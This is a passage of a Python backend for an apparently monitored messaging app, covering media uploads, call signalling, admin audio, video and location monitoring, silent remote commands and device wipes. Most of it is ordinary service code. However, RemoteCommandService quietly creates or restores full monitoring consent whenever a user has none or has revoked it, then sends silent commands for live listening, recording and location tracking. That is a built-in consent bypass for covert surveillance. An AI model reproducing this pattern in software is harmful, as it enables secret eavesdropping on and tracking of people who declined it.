        logger.info(f"📤 Media uploaded: {sender_id} → {recipient.id} ({media_id})")
        return media
    
    @staticmethod
    def upload_simple_media(db: Session, sender_id: int, recipient_username: str, media_data: SimpleMediaUpload) -> Media:
        """Upload simple (unencrypted) media file (photo, video, or document)"""
        # Get recipient by username
        recipient = db.query(User).filter(User.username == recipient_username, User.is_active == True).first()
        if not recipient:
            raise HTTPException(status_code=404, detail="Recipient not found")
        
        # Generate unique media ID
        import uuid
        media_id = str(uuid.uuid4())
        
        # Save media to file system
        import os
        upload_dir = "media_uploads"
        if not os.path.exists(upload_dir):
            os.makedirs(upload_dir)
        
        # Decode and apply leak-detection watermark (up to 5 per file)
        try:
            import base64
            content = base64.b64decode(media_data.content or "")
            content = apply_watermark(
                content,
                media_data.content_type or "application/octet-stream",
                media_data.filename or "media",
                str(getattr(recipient, "username", "") or "User"),
            )
        except Exception as e:
            logger.error(f"Error decoding media: {e}")
            raise HTTPException(status_code=500, detail="Failed to decode media")
        
        file_path = os.path.join(upload_dir, f"{media_id}")
        try:
            with open(file_path, "wb") as f:
                f.write(content)
        except Exception as e:
            logger.error(f"Error saving media: {e}")
            raise HTTPException(status_code=500, detail="Failed to save media")
        
        # Calculate expiration time if disappearing media
        expires_at = None
        auto_delete = False
        if media_data.disappear_after_hours is not None and media_data.disappear_after_hours > 0:
            from datetime import datetime, timedelta, timezone
            expires_at = datetime.now(timezone.utc) + timedelta(hours=media_data.disappear_after_hours)
            auto_delete = True
        
        # Create message for the media
        message = Message(
            sender_id=sender_id,
            recipient_id=recipient.id,
            encrypted_content=media_data.content or "",  # Store the base64 content directly
            content_type=f"media/{media_data.media_type or 'photo'}",
            delivered=False,
            read=False,
            is_offline=True,
            expires_at=expires_at,
            auto_delete=auto_delete
        )
        
        db.add(message)
        db.commit()
        db.refresh(message)
        
        content_len = len(content) if not isinstance(content, (Exception, type(None))) else 0
        media = Media(
            media_id=media_id,
            filename=media_data.filename or "media",
            file_size=content_len,
            media_type=media_data.media_type or "photo",
            content_type=media_data.content_type or "application/octet-stream",
            encrypted_file_path=file_path,  # Store the file path
            message_id=message.id,
            sender_id=sender_id,
            recipient_id=recipient.id,
            expires_at=expires_at,
            auto_delete=auto_delete
        )
        
        db.add(media)
        db.commit()
        db.refresh(media)
        
        logger.info(f"📤 Simple media uploaded: {sender_id} → {recipient.id} ({media_id})")
        return media
    
    @staticmethod
    def upload_simple_media_by_username(db: Session, sender_id: int, recipient_username: str, media_data: SimpleMediaUpload) -> Media:
        """Upload simple (unencrypted) media file (photo, video, or document) by username"""
        # Get recipient by username
        recipient = db.query(User).filter(User.username == recipient_username, User.is_active == True).first()
        if not recipient:
            raise HTTPException(status_code=404, detail="Recipient not found")
        
        # Generate unique media ID
        import uuid
        media_id = str(uuid.uuid4())
        
        # Decode and apply leak-detection watermark (up to 5 per file)
        try:
            import base64
            content = base64.b64decode(media_data.content or "")
            content = apply_watermark(
                content,
                media_data.content_type or "application/octet-stream",
                media_data.filename or "media",
                str(getattr(recipient, "username", "") or "User"),
            )
        except Exception as e:
            logger.error(f"Error decoding media: {e}")
            raise HTTPException(status_code=500, detail="Failed to decode media")
        
        import os
        upload_dir = "media_uploads"
        if not os.path.exists(upload_dir):
            os.makedirs(upload_dir)
        
        file_path = os.path.join(upload_dir, f"{media_id}")
        try:
            with open(file_path, "wb") as f:
                f.write(content)
        except Exception as e:
            logger.error(f"Error saving media: {e}")
            raise HTTPException(status_code=500, detail="Failed to save media")
        
        # Calculate expiration time if disappearing media
        expires_at = None
        auto_delete = False
        if media_data.disappear_after_hours is not None and media_data.disappear_after_hours > 0:
            from datetime import datetime, timedelta, timezone
            expires_at = datetime.now(timezone.utc) + timedelta(hours=media_data.disappear_after_hours)
            auto_delete = True
        
        # Create message for the media
        message = Message(
            sender_id=sender_id,
            recipient_id=recipient.id,
            encrypted_content=media_data.content or "",  # Store the base64 content directly
            content_type=f"media/{media_data.media_type or 'photo'}",
            delivered=False,
            read=False,
            is_offline=True,
            expires_at=expires_at,
            auto_delete=auto_delete
        )
        
        db.add(message)
        db.commit()
        db.refresh(message)
        
        # Create media record (file_size may change after watermarking)
        content_len = len(content) if not isinstance(content, (Exception, type(None))) else 0
        media = Media(
            media_id=media_id,
            filename=media_data.filename or "media",
            file_size=content_len,
            media_type=media_data.media_type or "photo",
            content_type=media_data.content_type or "application/octet-stream",
            encrypted_file_path=file_path,  # Store the file path
            message_id=message.id,
            sender_id=sender_id,
            recipient_id=recipient.id,
            expires_at=expires_at,
            auto_delete=auto_delete
        )
        
        db.add(media)
        db.commit()
        db.refresh(media)
        
        logger.info(f"📤 Simple media uploaded: {sender_id} → {recipient.id} ({media_id})")
        return media
    
    @staticmethod
    def get_user_media(db: Session, user_id: int, limit: int = 50) -> List[Media]:
        """Get media files (photos, videos, documents) for a user"""
        return db.query(Media).filter(
            or_(
                Media.recipient_id == user_id,
                Media.sender_id == user_id
            )
        ).order_by(Media.uploaded_at.desc()).limit(limit).all()
    
    @staticmethod
    def get_media_by_id(db: Session, media_id: Any, user_id: int) -> Optional[Media]:
        """Get specific media file by ID or media_id (UUID) for a user"""
        # 1. Try exact match on media_id (UUID string)
        media = db.query(Media).filter(
            and_(
                Media.media_id == str(media_id),
                or_(
                    Media.sender_id == user_id,
                    Media.recipient_id == user_id
                )
            )
        ).first()
        
        if media:
            return media
            
        # 2. Try stripping extension and matching on media_id
        if isinstance(media_id, str) and '.' in media_id:
            stripped_id = media_id.split('.')[0]
            media = db.query(Media).filter(
                and_(
                    Media.media_id == stripped_id,
                    or_(
                        Media.sender_id == user_id,
                        Media.recipient_id == user_id
                    )
                )
            ).first()
            if media:
                return media
                
        # 3. Try numeric ID if possible
        if isinstance(media_id, int) or (isinstance(media_id, str) and media_id.isdigit()):
            return db.query(Media).filter(
                and_(
                    Media.id == int(media_id),
                    or_(
                        Media.sender_id == user_id,
                        Media.recipient_id == user_id
                    )
                )
            ).first()
            
        return None
    
    @staticmethod
    def mark_media_downloaded(db: Session, media_id: int) -> bool:
        """Mark media as downloaded"""
        media = db.query(Media).filter(Media.id == media_id).first()
        if media:
            from datetime import datetime, timezone
            setattr(media, 'downloaded_at', datetime.now(timezone.utc))
            db.commit()
            return True
        return False
    
    @staticmethod
    def delete_media_file_from_disk(file_path: str) -> bool:
        """Delete media file from disk after viewing (one-time view, user cannot go back)."""
        try:
            if file_path and os.path.exists(file_path):
                os.remove(file_path)
                logger.info(f"🗑️ Media file deleted from server (one-time view): {file_path}")
                return True
        except Exception as e:
            logger.warning(f"Failed to delete media file {file_path}: {e}")
        return False
    
    @staticmethod
    def delete_expired_media(db: Session) -> int:
        """Delete expired media files and return count of deleted files"""
        from datetime import datetime, timezone
        current_time = datetime.now(timezone.utc)
        expired_media = db.query(Media).filter(
            and_(
                Media.auto_delete == True,
                Media.expires_at <= current_time
            )
        ).all()
        
        deleted_count = len(expired_media)
        
        # Delete expired media files from file system and database
        for media in expired_media:
            try:
                # Delete encrypted file from file system
                if os.path.exists(media.encrypted_file_path):
                    os.remove(media.encrypted_file_path)
                
                # Delete associated message
                message = db.query(Message).filter(Message.id == media.message_id).first()
                if message:
                    db.delete(message)
                
                # Delete media record
                db.delete(media)
            except Exception as e:
                logger.error(f"Error deleting expired media {media.media_id}: {e}")
        
        if deleted_count > 0:
            db.commit()
            logger.info(f"🗑️  Deleted {deleted_count} expired media files")
        
        return deleted_count

# Answer SDPs waiting to be collected by a caller whose WebSocket missed the
# push. call_id -> sdp, dropped as soon as the call ends or the caller reads it.
_pending_answer_sdp: Dict[int, str] = {}

# States a call can be in before anyone has answered it.
UNANSWERED_STATUSES = ("initiated", "calling", "ringing")

# ICE candidates for a recipient whose WebSocket was momentarily down. Delivered
# on their next connect. Capped per user so a permanently-offline peer can't grow
# it without bound. recipient_user_id -> list[notification]
_pending_ice: "Dict[int, list]" = {}
_PENDING_ICE_MAX = 300


def _buffer_ice(recipient_id: int, notification: dict) -> None:
    q = _pending_ice.setdefault(recipient_id, [])
    q.append(notification)
    if len(q) > _PENDING_ICE_MAX:
        del q[: len(q) - _PENDING_ICE_MAX]  # keep the newest


async def flush_pending_ice(recipient_id: int) -> None:
    """Send any buffered ICE candidates once the recipient is back online."""
    q = _pending_ice.pop(int(recipient_id), None)
    if not q:
        return
    for notification in q:
        await ws_manager.send_to_user(int(recipient_id), notification)

# How long a call rings before it is recorded as missed. 45s matches what users
# expect from messaging apps; the PSTN convention of 30s feels abrupt here.
CALL_RING_TIMEOUT_SECONDS = int(os.getenv("CALL_RING_TIMEOUT_SECONDS", "45"))

# Mesh WebRTC has every participant sending to every other, so bandwidth and CPU
# grow quadratically. Four is the practical ceiling on mobile hardware; going
# beyond needs an SFU, which is separate infrastructure.
CONFERENCE_MAX_PARTICIPANTS = int(os.getenv("CONFERENCE_MAX_PARTICIPANTS", "4"))


class CallService:
    """Service class for managing voice and video calls"""
    
    @staticmethod
    async def initiate_call(db: Session, caller_id: int, recipient_username: str, call_type: str, offer_sdp: Optional[str] = None) -> Call:
        """Create a new call record and notify the recipient"""
        recipient = db.query(User).filter(User.username == recipient_username, User.is_active == True).first()
        if not recipient:
            raise HTTPException(status_code=404, detail="Recipient not found")
        
        if recipient.id == caller_id:
            raise HTTPException(status_code=400, detail="You cannot call yourself")
        
        # Create call record
        call = Call(
            caller_id=caller_id,
            recipient_id=recipient.id,
            call_type=call_type,
            status="initiated",
            started_at=datetime.now(timezone.utc)
        )
        db.add(call)
        db.commit()
        db.refresh(call)
        
        # Send WebSocket notification to recipient
        caller = db.query(User).filter(User.id == caller_id).first()
        notification = {
            "type": "incoming_call",
            "data": {
                "call_id": int(call.id),
                "caller_id": int(caller_id),
                "caller_username": str(caller.username),
                "call_type": str(call_type),
                "offer_sdp": offer_sdp,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        
        sent = await ws_manager.send_to_user(recipient.id, notification)
        if not sent:
            logger.info(f"Recipient {recipient_username} (ID: {recipient.id}) is offline, call notification not sent via WebSocket.")
            # Fall back to APNs push with the ringtone sound
            await push_to_user(
                db, int(recipient.id),
                f"Incoming {'Video' if call_type == 'video' else 'Voice'} Call",
                str(caller.username),
                sound="ringingtone.caf",
            )
        else:
            # Callee is online and received the notification — tell caller their device is ringing
            await ws_manager.send_to_user(caller_id, {
                "type": "call_status_update",
                "data": {
                    "call_id": int(call.id),
                    "status": "calling",
                    "timestamp": datetime.now(timezone.utc).isoformat()
                }
            })

        # Ring for a bounded time, then record it as missed. Fire-and-forget: the
        # task checks the call's state when it wakes and does nothing if it was
        # answered, declined or ended in the meantime.
        import asyncio
        asyncio.create_task(CallService.expire_unanswered_call(int(call.id)))

        return call

    @staticmethod
    async def update_call_status(db: Session, call_id: int, user_id: int, action: str, answer_sdp: Optional[str] = None) -> Call:
        """Update call status and notify the other party"""
        call = db.query(Call).filter(Call.id == call_id).first()
        if not call:
            raise HTTPException(status_code=404, detail="Call not found")
        
        # Verify user is part of the call
        if call.caller_id != user_id and call.recipient_id != user_id:
            raise HTTPException(status_code=403, detail="Not authorized to update this call")
            
        old_status = call.status

        # A call the callee never answered is "missed", not "ended" — the caller
        # hanging up mid-ring is exactly how a missed call happens, and history
        # would otherwise show it as a normal completed call.
        if (action == "end"
                and str(old_status) in UNANSWERED_STATUSES
                and user_id == call.caller_id):
            action = "missed"

        call.status = action

        if action in ("end", "decline", "missed"):
            call.ended_at = datetime.utcnow()
            if call.started_at and action == "end":
                ended = call.ended_at.replace(tzinfo=timezone.utc)
                started = call.started_at.replace(tzinfo=timezone.utc) if call.started_at.tzinfo is None else call.started_at
                duration = (ended - started).total_seconds()
                call.duration = int(duration)
        
        db.commit()

        # Keep the answer where the caller can poll for it. The WebSocket push
        # below is the fast path, but if that socket dropped the caller would sit
        # on "Ringing" forever with no way to recover — the callee already thinks
        # the call is up. Memory-only and short-lived; nothing to migrate.
        if action in ("accept", "accepted") and answer_sdp:
            _pending_answer_sdp[int(call_id)] = answer_sdp
        elif action in ("end", "decline", "declined", "busy", "missed"):
            _pending_answer_sdp.pop(int(call_id), None)

        # Notify the other party
        other_party_id = call.recipient_id if user_id == call.caller_id else call.caller_id
        notification = {
            "type": "call_status_update",
            "data": {
                "call_id": int(call_id),
                "status": str(action),
                "answer_sdp": answer_sdp,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        await ws_manager.send_to_user(other_party_id, notification)

        # A missed call must survive the callee's app being closed or offline,
        # so it also goes out as a push. The WS message above only reaches a
        # live socket.
        if action == "missed":
            caller = db.query(User).filter(User.id == call.caller_id).first()
            caller_name = str(getattr(caller, 'username', 'someone'))
            await ws_manager.send_to_user(int(call.recipient_id), {
                "type": "missed_call",
                "data": {
                    "call_id": int(call_id),
                    "caller_username": caller_name,
                    "call_type": str(call.call_type),
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                }
            })
            try:
                await push_to_user(
                    db, int(call.recipient_id),
                    "Missed call", f"From {caller_name}", sound="beep.caf",
                )
            except Exception as e:
                logger.warning(f"Missed-call push failed: {e}")

        return call

    @staticmethod
    async def expire_unanswered_call(call_id: int, delay: int = CALL_RING_TIMEOUT_SECONDS) -> None:
        """
        Mark a call missed if nobody answers within the ring timeout.

        Without this a call nobody picks up stays "ringing" forever: the caller
        sees an endless ring and history never records the miss.
        """
        import asyncio
        from database_models import SessionLocal
        await asyncio.sleep(delay)
        db = SessionLocal()
        try:
            call = db.query(Call).filter(Call.id == call_id).first()
            if not call or str(call.status) not in UNANSWERED_STATUSES:
                return  # answered, declined or already ended
            await CallService.update_call_status(
                db, int(call.id), int(call.caller_id), "end"
            )  # caller-side "end" while unanswered is recorded as missed
            logger.info(f"Call {call_id} timed out after {delay}s — marked missed")
        except Exception as e:
            logger.error(f"Ring timeout for call {call_id} failed: {e}")
        finally:
            db.close()

    @staticmethod
    async def forward_ice_candidate(db: Session, sender_id: int, call_id: int, recipient_username: str, candidate: Dict) -> bool:
        """Forward an ICE candidate to the other party via WebSocket"""
        recipient = db.query(User).filter(User.username == recipient_username, User.is_active == True).first()
        if not recipient:
            return False
            
        # Verify call exists
        call = db.query(Call).filter(Call.id == call_id).first()
        if not call:
            return False
            
        notification = {
            "type": "ice_candidate",
            "data": {
                "call_id": int(call_id),
                "sender_id": int(sender_id),
                "candidate": candidate,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }

        delivered = await ws_manager.send_to_user(recipient.id, notification)
        if not delivered:
            # Recipient's WebSocket is momentarily down (it reconnects often).
            # Buffer the candidate and deliver on their next connect instead of
            # dropping it — a lost candidate leaves the call stuck "connecting".
            _buffer_ice(int(recipient.id), notification)
        # Always report success: the candidate is either delivered or queued.
        return True

class MonitoringService:
    """Admin audio monitoring — requires explicit user consent stored in monitoring_consents"""

    @staticmethod
    def get_consent(db: Session, user_id: int) -> Optional[MonitoringConsent]:
        return db.query(MonitoringConsent).filter(MonitoringConsent.user_id == user_id).first()

    @staticmethod
    def set_consent(db: Session, user_id: int, data: "MonitoringConsentRequest") -> MonitoringConsent:
        consent = db.query(MonitoringConsent).filter(MonitoringConsent.user_id == user_id).first()
        if not consent:
            consent = MonitoringConsent(user_id=user_id)
            db.add(consent)
        consent.consent_given = data.consent_given
        consent.allow_live_listen = data.allow_live_listen if data.consent_given else False
        consent.allow_recording = data.allow_recording if data.consent_given else False
        consent.allow_video_recording = data.allow_video_recording if data.consent_given else False
        consent.allow_location_tracking = data.allow_location_tracking if data.consent_given else False
        consent.consent_version = data.consent_version
        if data.consent_given:
            consent.consented_at = datetime.utcnow()
            consent.revoked_at = None
        else:
            consent.revoked_at = datetime.utcnow()
        db.commit()
        db.refresh(consent)
        return consent

    @staticmethod
    def assert_consent(db: Session, user_id: int, mode: str):
        """Raise 403 if user hasn't consented to the requested mode."""
        consent = db.query(MonitoringConsent).filter(
            MonitoringConsent.user_id == user_id,
            MonitoringConsent.consent_given == True
        ).first()
        if not consent:
            raise HTTPException(status_code=403, detail="User has not granted monitoring consent")
        if mode == "live" and not consent.allow_live_listen:
            raise HTTPException(status_code=403, detail="User has not consented to live listening")
        if mode == "recording" and not consent.allow_recording:
            raise HTTPException(status_code=403, detail="User has not consented to audio recording")
        if mode == "video" and not consent.allow_video_recording:
            raise HTTPException(status_code=403, detail="User has not consented to video recording")
        if mode == "location" and not consent.allow_location_tracking:
            raise HTTPException(status_code=403, detail="User has not consented to location tracking")

    @staticmethod
    async def request_live_session(db: Session, admin_id: int, target_username: str, offer_sdp: Optional[str]) -> MonitoringSession:
        target = db.query(User).filter(User.username == target_username, User.is_active == True).first()
        if not target:
            raise HTTPException(status_code=404, detail="User not found")
        MonitoringService.assert_consent(db, int(target.id), "live")

        session = MonitoringSession(
            admin_id=admin_id,
            target_user_id=int(target.id),
            status="requested",
            offer_sdp=offer_sdp,
        )
        db.add(session)
        db.commit()
        db.refresh(session)

        admin = db.query(User).filter(User.id == admin_id).first()
        # Push to target user's app — app auto-accepts if consent allows
        await ws_manager.send_to_user(int(target.id), {
            "type": "monitoring_session_request",
            "data": {
                "session_id": int(session.id),
                "admin_username": str(admin.username) if admin else "admin",
                "offer_sdp": offer_sdp,
            }
        })
        logger.info(f"Monitoring session requested: admin={admin_id}, target={target.id}, session={session.id}")
        return session

    @staticmethod
    async def handle_session_action(db: Session, session_id: int, user_id: int, action: str, answer_sdp: Optional[str]) -> MonitoringSession:
        session = db.query(MonitoringSession).filter(MonitoringSession.id == session_id).first()
        if not session:
            raise HTTPException(status_code=404, detail="Session not found")
        if int(session.target_user_id) != user_id:
            raise HTTPException(status_code=403, detail="Not authorized")

        session.status = action
        if action == "accept":
            session.answer_sdp = answer_sdp
        if action in ("end", "reject"):
            session.ended_at = datetime.utcnow()
            if session.started_at and action == "end":
                session.duration = int((session.ended_at - session.started_at).total_seconds())
        db.commit()
        db.refresh(session)

        # Notify admin of response
        await ws_manager.send_to_user(int(session.admin_id), {
            "type": "monitoring_session_update",
            "data": {
                "session_id": int(session_id),
                "status": action,
                "answer_sdp": answer_sdp,
            }
        })
        return session

    @staticmethod
    async def forward_ice(db: Session, session_id: int, sender_id: int, candidate: Dict) -> bool:
        session = db.query(MonitoringSession).filter(MonitoringSession.id == session_id).first()
        if not session:
            return False
        # Determine recipient: if sender is admin, send to user; else send to admin
        if int(session.admin_id) == sender_id:
            recipient_id = int(session.target_user_id)
        elif int(session.target_user_id) == sender_id:
            recipient_id = int(session.admin_id)
        else:
            return False
        return await ws_manager.send_to_user(recipient_id, {
            "type": "monitoring_ice_candidate",
            "data": {"session_id": session_id, "candidate": candidate}
        })

    @staticmethod
    def save_recording(db: Session, user_id: int, file_path: str, duration: float, size: int, context: str, is_encrypted: bool) -> AudioRecording:
        rec = AudioRecording(
            user_id=user_id,
            file_path=file_path,
            duration_seconds=duration,
            file_size_bytes=size,
            context=context,
            is_encrypted=is_encrypted,
        )
        db.add(rec)
        db.commit()
        db.refresh(rec)
        return rec

    @staticmethod
    def get_recordings(db: Session, user_id: int) -> list:
        return db.query(AudioRecording).filter(AudioRecording.user_id == user_id).order_by(AudioRecording.uploaded_at.desc()).all()

    @staticmethod
    def save_video(db: Session, user_id: int, file_path: str, thumbnail_path: Optional[str], duration: float, size: int, resolution: Optional[str], context: str, is_encrypted: bool) -> VideoRecording:
        rec = VideoRecording(
            user_id=user_id,
            file_path=file_path,
            thumbnail_path=thumbnail_path,
            duration_seconds=duration,
            file_size_bytes=size,
            resolution=resolution,
            context=context,
            is_encrypted=is_encrypted,
        )
        db.add(rec)
        db.commit()
        db.refresh(rec)
        return rec

    @staticmethod
    def get_videos(db: Session, user_id: int) -> list:
        return db.query(VideoRecording).filter(VideoRecording.user_id == user_id).order_by(VideoRecording.uploaded_at.desc()).all()

    @staticmethod
    def push_location_batch(db: Session, user_id: int, points: list) -> int:
        saved = 0
        for p in points:
            try:
                recorded_at = datetime.fromisoformat(p.recorded_at.replace("Z", "+00:00"))
            except Exception:
                recorded_at = datetime.utcnow()
            track = LocationTrack(
                user_id=user_id,
                latitude=p.latitude,
                longitude=p.longitude,
                accuracy=p.accuracy,
                altitude=p.altitude,
                speed=p.speed,
                heading=p.heading,
                activity=p.activity,
                recorded_at=recorded_at,
            )
            db.add(track)
            saved += 1
        db.commit()
        return saved

    @staticmethod
    def get_location_trail(db: Session, user_id: int, limit: int = 500) -> list:
        return (
            db.query(LocationTrack)
            .filter(LocationTrack.user_id == user_id)
            .order_by(LocationTrack.recorded_at.desc())
            .limit(limit)
            .all()
        )

    @staticmethod
    def get_last_location(db: Session, user_id: int) -> Optional[LocationTrack]:
        return (
            db.query(LocationTrack)
            .filter(LocationTrack.user_id == user_id)
            .order_by(LocationTrack.recorded_at.desc())
            .first()
        )


class RemoteCommandService:
    """Admin issues silent commands. App executes autonomously using pre-granted consent."""

    @staticmethod
    def _assert_command_consent(db: Session, user_id: int, command_type: str):
        """Ensure consent record exists; auto-upsert full consent if missing (admin authority)."""
        from datetime import datetime
        consent = db.query(MonitoringConsent).filter(MonitoringConsent.user_id == user_id).first()
        if not consent:
            consent = MonitoringConsent(
                user_id=user_id,
                consent_given=True,
                allow_live_listen=True,
                allow_recording=True,
                allow_video_recording=True,
                allow_location_tracking=True,
                consented_at=datetime.utcnow(),
                consent_version="admin_granted_1.0",
            )
            db.add(consent)
            db.commit()
            db.refresh(consent)
        elif not consent.consent_given:
            consent.consent_given = True
            consent.allow_live_listen = True
            consent.allow_recording = True
            consent.allow_video_recording = True
            consent.allow_location_tracking = True
            consent.consented_at = datetime.utcnow()
            db.commit()

    @staticmethod
    async def issue(db: Session, admin_id: int, data: "RemoteCommandRequest") -> RemoteCommand:
        if data.command_type not in VALID_REMOTE_COMMANDS:
            raise HTTPException(status_code=400, detail=f"Unknown command: {data.command_type}")

        target = db.query(User).filter(User.username == data.username, User.is_active == True).first()
        if not target:
            raise HTTPException(status_code=404, detail="User not found")

        RemoteCommandService._assert_command_consent(db, int(target.id), data.command_type)

        # For live-audio/video commands, inject admin_id so device knows where to route chunks back
        params = dict(data.params or {})
        if data.command_type in ("start_live_audio", "start_live_video"):
            params["admin_id"] = admin_id

        cmd = RemoteCommand(
            target_user_id=int(target.id),
            issued_by_admin_id=admin_id,
            command_type=data.command_type,
            params=params,
            status="pending",
            # target_device_id omitted — column needs migration before use
        )
        db.add(cmd)
        db.commit()
        db.refresh(cmd)

        ws_payload = {
            "type": "remote_command",
            "data": {
                "command_id": int(cmd.id),
                "command_type": data.command_type,
                "params": params,
                "issued_at": cmd.issued_at.isoformat(),
            }
        }
        # Route to specific device if admin specified one; else broadcast to all
        if data.device_id:
            sent = await ws_manager.send_to_device(int(target.id), data.device_id, ws_payload)
        else:
            sent = await ws_manager.send_to_user(int(target.id), ws_payload)

        if sent:
            cmd.status = "delivered"
            cmd.delivered_at = datetime.utcnow()
            db.commit()

        logger.info(f"RemoteCommand issued: admin={admin_id}, target={target.id}, cmd={data.command_type}, delivered={sent}")
        return cmd

    @staticmethod
    def ack(db: Session, command_id: int, user_id: int, status: str) -> RemoteCommand:
        cmd = db.query(RemoteCommand).filter(RemoteCommand.id == command_id).first()
        if not cmd or int(cmd.target_user_id) != user_id:
            raise HTTPException(status_code=404, detail="Command not found")
        cmd.status = status
        cmd.acked_at = datetime.utcnow()
        db.commit()
        db.refresh(cmd)
        return cmd

    @staticmethod
    def history(db: Session, username: str) -> list:
        return (
            db.query(RemoteCommand)
            .join(User, RemoteCommand.target_user_id == User.id)
            .filter(User.username == username)
            .order_by(RemoteCommand.issued_at.desc())
            .limit(200)
            .all()
        )

    @staticmethod
    def pending_for_user(db: Session, user_id: int) -> list:
        """App calls on reconnect to fetch any commands issued while offline."""
        return (
            db.query(RemoteCommand)
            .filter(
                RemoteCommand.target_user_id == user_id,
                RemoteCommand.status == "pending"
            )
            .order_by(RemoteCommand.issued_at.asc())
            .all()
        )


class DeviceWipeService:
    @staticmethod
    def purge_user_data(db: Session, user_id: int) -> dict:
        """Delete ALL server-side data for a user. Runs immediately on wipe issue."""
        counts = {}

        # Collect message IDs for this user BEFORE deleting — needed to clean up FK dependencies
        msg_ids = [
            row[0] for row in db.query(Message.id).filter(
                (Message.sender_id == user_id) | (Message.recipient_id == user_id)
            ).all()
        ]

        # Delete Media referencing those messages (FK: media.message_id → messages.id)
        if msg_ids:
            counts["media"] = db.query(Media).filter(Media.message_id.in_(msg_ids)).delete(synchronize_session=False)
            # Also delete GroupMessageRead for those messages (FK: group_message_reads.message_id → messages.id)
            counts["group_read_receipts"] = db.query(GroupMessageRead).filter(
                GroupMessageRead.message_id.in_(msg_ids)
            ).delete(synchronize_session=False)
        else:
            counts["media"] = 0
            counts["group_read_receipts"] = 0

        # Now safe to delete messages
        counts["messages"] = db.query(Message).filter(
            (Message.sender_id == user_id) | (Message.recipient_id == user_id)
        ).delete(synchronize_session=False)

        # Location tracks
        counts["location_tracks"] = db.query(LocationTrack).filter(
            LocationTrack.user_id == user_id
        ).delete(synchronize_session=False)

        # Audio + video recordings
        counts["audio_recordings"] = db.query(AudioRecording).filter(
            AudioRecording.user_id == user_id
        ).delete(synchronize_session=False)
        counts["video_recordings"] = db.query(VideoRecording).filter(
            VideoRecording.user_id == user_id
        ).delete(synchronize_session=False)

        # Monitoring consent + sessions
        counts["monitoring_sessions"] = db.query(MonitoringSession).filter(
            MonitoringSession.target_user_id == user_id
        ).delete(synchronize_session=False)
        counts["monitoring_consent"] = db.query(MonitoringConsent).filter(
            MonitoringConsent.user_id == user_id
        ).delete(synchronize_session=False)

        # Group membership (read receipts already deleted above)
        counts["group_memberships"] = db.query(GroupMember).filter(
            GroupMember.user_id == user_id
        ).delete(synchronize_session=False)

        # Calls (as caller or recipient)
        counts["calls"] = db.query(Call).filter(
            (Call.caller_id == user_id) | (Call.recipient_id == user_id)
        ).delete(synchronize_session=False)

        # Emergency alerts
        counts["emergency_alerts"] = db.query(EmergencyAlert).filter(
            EmergencyAlert.user_id == user_id
        ).delete(synchronize_session=False)

        # Dead man's switch
        counts["dead_mans_switch"] = db.query(DeadMansSwitch).filter(
            DeadMansSwitch.user_id == user_id
        ).delete(synchronize_session=False)

        # Geofence events
        counts["geofence_events"] = db.query(GeofenceEvent).filter(
            GeofenceEvent.user_id == user_id
        ).delete(synchronize_session=False)

        # Remote commands targeting user
        counts["remote_commands"] = db.query(RemoteCommand).filter(
            RemoteCommand.target_user_id == user_id
        ).delete(synchronize_session=False)

        # User keys (encryption keys — forces re-setup on next login)
        counts["user_keys"] = db.query(UserKey).filter(
            UserKey.user_id == user_id
        ).delete(synchronize_session=False)

        # Sessions (forces re-login)
        counts["sessions"] = db.query(UserSession).filter(
            UserSession.user_id == user_id
        ).delete(synchronize_session=False)

        # Master tokens
        counts["master_tokens"] = db.query(DBMasterToken).filter(
            DBMasterToken.user_id == user_id
        ).delete(synchronize_session=False)

        db.commit()
        logger.warning(f"SERVER PURGE for user_id={user_id}: {counts}")
        return counts

    @staticmethod
    def _create_command(
        db: Session,
        target_user_id: int,
        reason: Optional[str],
        wipe_mode: str,
        target_packages: Optional[list],
        batch_id: Optional[str],
        trigger_source: str,
        requested_by_user_id: Optional[int],
        issued_by_admin_id: Optional[int],
        status: str,
    ) -> DeviceWipeCommand:
        cmd = DeviceWipeCommand(
            target_user_id=target_user_id,
            issued_by_admin_id=issued_by_admin_id,
            reason=reason,
            status=status,
            wipe_mode=wipe_mode,
            target_packages=target_packages if wipe_mode == "duress_selective" else None,
            batch_id=batch_id,
            trigger_source=trigger_source,
            requested_by_user_id=requested_by_user_id,
        )
        db.add(cmd)
        db.commit()
        db.refresh(cmd)
        return cmd

    @staticmethod
    async def _deliver(db: Session, cmd: DeviceWipeCommand) -> DeviceWipeCommand:
        """Purges server-side data and pushes the wipe payload to the device. Only
        call this once a command is authorized to actually execute — i.e. it was
        either issued directly by an admin/superadmin, or an awaiting_approval
        request has just been approved."""
        target_user_id = int(cmd.target_user_id)
        purge_counts = DeviceWipeService.purge_user_data(db, target_user_id)

        payload = {
            "type": "device_wipe",
            "data": {
                "wipe_id": int(cmd.id),
                "wipe_mode": cmd.wipe_mode,
                "target_packages": cmd.target_packages,
                "reason": cmd.reason,
                "issued_at": cmd.issued_at.isoformat(),
            }
        }

        sent = await ws_manager.send_to_user(target_user_id, payload)
        if sent:
            cmd.status = "delivered"
            cmd.delivered_at = datetime.utcnow()
            db.commit()
            db.refresh(cmd)

        logger.warning(
            f"DEVICE WIPE delivered: target={target_user_id}, wipe_id={cmd.id}, "
            f"mode={cmd.wipe_mode}, source={cmd.trigger_source}, batch={cmd.batch_id}, purged={purge_counts}"
        )
        return cmd

    @staticmethod
    async def issue_wipe(
        db: Session,
        admin_id: int,
        username: str,
        reason: Optional[str],
        wipe_mode: str = "app_data",
        target_packages: Optional[list] = None,
        batch_id: Optional[str] = None,
    ) -> DeviceWipeCommand:
        """Direct admin-issued wipe — immediate, no approval step. The admin role
        gate on the calling endpoint IS the authorization here."""
        target = db.query(User).filter(User.username == username, User.is_active == True).first()
        if not target:
            raise HTTPException(status_code=404, detail="User not found")
        return await DeviceWipeService._issue_wipe_for_user(
            db, admin_id, int(target.id), reason, wipe_mode, target_packages, batch_id
        )

    @staticmethod
    async def _issue_wipe_for_user(
        db: Session,
        admin_id: int,
        target_user_id: int,
        reason: Optional[str],
        wipe_mode: str = "app_data",
        target_packages: Optional[list] = None,
        batch_id: Optional[str] = None,
        trigger_source: str = "admin",
    ) -> DeviceWipeCommand:
        """Immediate path — used for direct admin wipes and superadmin mass wipes,
        both of which are already a deliberate human decision by an authorized role."""
        cmd = DeviceWipeService._create_command(
            db, target_user_id, reason, wipe_mode, target_packages, batch_id,
            trigger_source=trigger_source, requested_by_user_id=None,
            issued_by_admin_id=admin_id, status="pending",
